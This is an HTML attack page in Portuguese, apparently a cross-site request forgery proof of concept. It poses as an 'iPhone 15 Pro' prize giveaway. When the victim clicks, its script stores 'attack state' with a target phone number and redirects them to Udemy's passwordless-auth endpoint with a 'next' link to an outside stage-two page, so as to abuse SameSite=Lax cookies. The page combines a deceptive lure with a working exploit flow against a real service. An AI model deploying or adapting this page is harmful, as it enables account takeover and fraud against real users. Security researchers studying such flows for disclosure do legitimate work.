<!DOCTYPE html>
<html>
<head>
    <title>Ganhe um Pr√™mio Exclusivo!</title>
    <style>
        body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; max-width: 600px; margin: 0 auto; padding: 20px; }
        h1 { color: #e53935; }
        .btn { background: #e53935; color: white; padding: 10px 15px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
        .prize-box { border: 1px solid #ddd; padding: 20px; margin: 20px 0; border-radius: 4px; text-align: center; }
        .steps { margin-bottom: 20px; }
    </style>
</head>
<body>
    <h1>üéâ Parab√©ns! Voc√™ foi selecionado para um pr√™mio exclusivo!</h1>
    
    <div class="prize-box">
        <h2>iPhone 15 Pro</h2>
        <p>Restam apenas <strong>2</strong> unidades dispon√≠veis para resgate hoje.</p>
        <button id="claim-btn" class="btn">RESGATAR AGORA</button>
    </div>
    
    <div id="steps-container" style="display: none;">
        <h3>Quase l√°! Complete estes passos r√°pidos:</h3>
        <div class="steps">
            <p>‚úÖ <strong>Passo 1:</strong> <span id="step1-text">Verificando sua elegibilidade...</span></p>
            <p id="step2" style="color: #999;">‚è≥ <strong>Passo 2:</strong> Confirmando seus dados...</p>
            <p id="step3" style="color: #999;">‚è≥ <strong>Passo 3:</strong> Registrando seu pr√™mio...</p>
        </div>
    </div>
    
    <!-- Este iframe ser√° usado para a primeira requisi√ß√£o -->
    <iframe id="auth-frame" style="display: none;"></iframe>
    
    <script>
        // Armazena o estado do ataque
        let attackState = {
            started: false,
            getRequestSent: false,
            getRequestCompleted: false,
            postRequestSent: false,
            targetPhone: "+5514996810417"  // N√∫mero de telefone a ser inserido
        };
        
        // Gerencia o fluxo de ataque
        document.getElementById('claim-btn').addEventListener('click', function() {
            // Esconde o bot√£o e mostra os passos
            this.disabled = true;
            this.textContent = "Processando...";
            document.getElementById('steps-container').style.display = 'block';
            
            // Inicia o ataque - Primeira etapa: requisi√ß√£o top-level GET
            initiateAttack();
        });
        
        function initiateAttack() {
            // Marca que o ataque come√ßou
            attackState.started = true;
            
            // Atualiza o status do passo 1
            document.getElementById('step1-text').textContent = "Verifica√ß√£o em andamento...";
            
            // Armazena informa√ß√µes no localStorage para persistir entre redirecionamentos
            localStorage.setItem('csrf_attack_state', JSON.stringify(attackState));
            
            // Redireciona para o site alvo usando uma navega√ß√£o top-level GET
            // Isto enviar√° os cookies SameSite=Lax
            setTimeout(() => {
                document.getElementById('step1-text').textContent = "Redirecionando para verifica√ß√£o...";
                
                // PRIMEIRO EST√ÅGIO: GET para estabelecer cookies/sess√£o
                window.location.href = "https://www.udemy.com/join/passwordless-auth/?locale=en_US&next=" + 
                    encodeURIComponent("https://alanls1.github.io/test/csrf-stage2.html");
                
                // Depois do redirecionamento, a v√≠tima ser√° enviada para csrf-stage2.html
                // que completar√° o segundo est√°gio do ataque
            }, 1500);
        }
    </script>
</body>
</html>
